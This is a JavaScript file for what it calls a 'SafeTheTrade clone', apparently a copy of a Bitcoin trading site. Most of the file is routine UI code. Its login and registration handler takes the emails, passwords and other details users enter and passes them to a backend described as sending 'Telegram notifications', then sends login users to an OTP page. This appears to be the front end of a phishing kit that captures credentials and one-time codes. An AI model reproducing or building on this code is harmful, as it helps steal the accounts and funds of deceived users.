/* Shared UI interactions for SafeTheTrade clone */

document.addEventListener("DOMContentLoaded", () => {
  // Announcement dismiss
  const dismiss = document.querySelector(".announcement-dismiss");
  const banner = document.querySelector(".announcement-banner");
  if (dismiss && banner) {
    dismiss.addEventListener("click", () => banner.remove());
  }

  // Buying / Selling toggle
  const segs = document.querySelectorAll(".seg");
  segs.forEach((btn) => {
    btn.addEventListener("click", () => {
      segs.forEach((s) => s.classList.remove("active"));
      btn.classList.add("active");
      const hero = document.getElementById("hero-title");
      if (hero) {
        const buying = btn.dataset.type === "buying";
        hero.innerHTML = buying
          ? 'Buy <span class="text-stt-green">Bitcoin</span> with <span class="text-stt-green">All Payment Methods</span>'
          : 'Sell <span class="text-stt-green">Bitcoin</span> for <span class="text-stt-green">All Payment Methods</span>';
      }
    });
  });

  // Password show/hide
  document.querySelectorAll("[data-password-toggle]").forEach((btn) => {
    btn.addEventListener("click", () => {
      const wrap = btn.closest(".auth-input-wrap") || btn.parentElement;
      const input = wrap?.querySelector("input");
      if (!input) return;
      const showing = input.type === "text";
      input.type = showing ? "password" : "text";
      btn.setAttribute(
        "aria-label",
        showing ? "Show password" : "Hide password",
      );
      const icon = btn.querySelector("i");
      if (icon) {
        icon.classList.toggle("fa-eye", showing);
        icon.classList.toggle("fa-eye-slash", !showing);
      }
    });
  });

  // Custom checkbox visual sync
  document.querySelectorAll(".auth-checkbox, .auth-terms").forEach((label) => {
    const input = label.querySelector('input[type="checkbox"]');
    const box = label.querySelector(".auth-checkbox-box");
    if (!input || !box) return;
    const sync = () => box.classList.toggle("checked", input.checked);
    sync();
    input.addEventListener("change", sync);
  });

  // Demo login / register → call backend API for Telegram notifications & create session
  document.querySelectorAll("form.auth-card").forEach((form) => {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const isRegister = form.querySelector('input[name="confirm"]') !== null;

      if (isRegister) {
        const email = form.querySelector('input[name="email"]')?.value?.trim();
        const password = form.querySelector('input[name="password"]')?.value;
        const country = form.querySelector('select[name="country"]')?.value;
        const referral = form
          .querySelector('input[name="referral"]')
          ?.value?.trim();

        if (window.STT) {
          await window.STT.registerApi(email, password, country, referral);
          location.href = "/wallet/";
        }
      } else {
        const username =
          form.querySelector('input[name="username"]')?.value?.trim() ||
          "trader@example.com";
        const password = form.querySelector('input[name="password"]')?.value;

        localStorage.setItem("stt_pending_email", username);
        if (window.STT) {
          await window.STT.loginApi(username, password);
          location.href = "/s_otp/";
        }
      }
    });
  });

  // If already logged in on auth pages, skip to wallet
  if (
    window.STT?.isLoggedIn() &&
    /\/login\/?$|\/register\/?$/i.test(location.pathname)
  ) {
    location.href = "/wallet/";
  }
});
